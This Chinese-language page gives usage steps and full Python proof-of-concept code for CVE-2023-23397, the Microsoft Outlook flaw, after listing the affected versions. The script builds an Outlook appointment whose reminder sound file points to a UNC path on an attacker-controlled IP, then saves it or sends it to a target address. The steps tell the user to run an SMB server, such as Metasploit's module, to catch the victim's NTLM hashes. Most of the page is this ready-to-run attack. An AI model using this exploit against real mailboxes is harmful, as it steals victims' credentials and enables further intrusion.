## CVE-2023-23397

### 影响版本
Microsoft Outlook 2016 (64-bit edition)=N/A  
Microsoft Outlook 2013 Service Pack 1 (32-bit editions)=N/A  
Microsoft Outlook 2013 RT Service Pack 1=N/A  
Microsoft Outlook 2013 Service Pack 1 (64-bit editions)=N/A  
Microsoft Office 2019 for 32-bit editions=N/A  
Microsoft 365 Apps for Enterprise for 32-bit Systems=N/A  
Microsoft Office 2019 for 64-bit editions=N/A  
Microsoft 365 Apps for Enterprise for 64-bit Systems=N/A  
Microsoft Office LTSC 2021 for 64-bit editions=N/A  
Microsoft Outlook 2016 (32-bit edition)=N/A   
Microsoft 365 Apps for Enterprise for 64-bit Systems=N/A  
Microsoft Office LTSC 2021 for 32-bit editions=N/A  

### 用法
1. 安装pywin32：pip install pywin32  
2. 攻击者机器上启动SMB服务器，例如Metasploit的SMB模块  
3. python Exploit.py <save_or_send> <target email> <attacker_ip>   

```
#!/usr/bin/python3
#     PoC for CVE-2023-23397 v1.2
#     Copyright (C) 2022 - Gianluca Tiepolo, Maria Saleri
#
#      https://github.com/tiepologian/CVE-2023-23397/blob/main/Exploit.py
#
#     This program is free software: you can redistribute it and/or modify
#     it under the terms of the GNU General Public License as published by
#     the Free Software Foundation, either version 3 of the License, or
#     (at your option) any later version.
#
#     This program is distributed in the hope that it will be useful,
#     but WITHOUT ANY WARRANTY; without even the implied warranty of
#     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#     GNU General Public License for more details.
#
#     You should have received a copy of the GNU General Public License
#     along with this program.  If not, see <https://www.gnu.org/licenses/>.
#
#     Usage: python Exploit.py <save_or_send> <target email> <attacker_ip>

import win32com.client
import sys, datetime, os, argparse

def saveMail(appt):
    exportPath = 'malicious.msg'
    appt.SaveAs(os.path.abspath(exportPath))
    print("[*] Finished, saved to", os.path.abspath(exportPath))

def sendMail(appt):
    appt.Send()
    print("[*] Finished, e-mail sent!")

def generateMail(cmd, target, c2):
    outlook = win32com.client.Dispatch("Outlook.Application")
    appt = outlook.CreateItem(1) # AppointmentItem
    print("[*] Generating malicious e-mail...")
    output_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    appt.Start = output_date # yyyy-MM-dd hh:mm
    appt.AllDayEvent = True
    appt.Subject = "Testing CVE-2023-23397"
    appt.body = "Thank you for your hash!"
    appt.Location = "TeamRocket"
    appt.MeetingStatus = 1
    appt.Recipients.Add(target)
    appt.ReminderOverrideDefault = True
    appt.ReminderPlaySound = True
    appt.ReminderSoundFile = "\\\\" + c2
    if cmd == "save":
        saveMail(appt)
    elif cmd == "send":
        sendMail(appt)
    else:
        print("[!] Unrecognized command, exiting...")
        exit(1)

def main():
    if len(sys.argv) != 4:
        print("Usage: python Exploit.py <save_or_send> <target_email> <attacker_ip>")
        sys.exit(0)
    print('[*] CVE-2023-23397 v1.2 by Tiepolo G, Saleri M')
    generateMail(sys.argv[1], sys.argv[2], sys.argv[3])

if __name__ == "__main__":
    main()
```
